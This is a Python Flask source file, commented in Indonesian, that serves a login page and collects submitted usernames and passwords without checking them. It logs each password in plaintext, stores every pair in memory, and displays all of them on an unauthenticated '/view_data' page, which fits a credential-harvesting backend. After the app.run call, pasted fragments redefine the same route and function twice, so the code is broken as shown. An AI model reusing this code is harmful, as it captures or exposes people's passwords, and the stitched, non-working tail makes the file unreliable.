from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import logging

app = Flask(__name__)
CORS(app)  # Tambahkan CORS sebelum mendefinisikan route

# Tambahkan logging ke aplikasi Flask
logging.basicConfig(level=logging.DEBUG)

# Variabel untuk menyimpan data login sementara
login_data = []

@app.route('/')
def index():
    logging.debug("Rendering login page")
    # Tampilkan halaman login
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    # Ambil data dari form login
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    # Simpan data login ke dalam list
    login_data.append({'username': username, 'password': password})
    
    # Log untuk debugging
    logging.debug(f"Received Username: {username}")
    logging.debug(f"Received Password: {password}")
    
    # Kirimkan respons
    return jsonify(message="Login data received!"), 200

@app.route('/view_data')
def view_data():
    logging.debug("Rendering view_data page")
    # Menampilkan data username dan password yang telah dimasukkan
    return render_template('view_data.html', login_data=login_data)

if __name__ == '__main__':
    app.run(debug=True)

import os

@app.route('/')
def index():
    app.logger.info("Rendering login page...")
    app.logger.info(f"Current directory: {os.getcwd()}")
    app.logger.info(f"Template folder: {app.template_folder}")
    return render_template('login.html')

@app.route('/')
def index():
    return "Login Page (debug mode)"
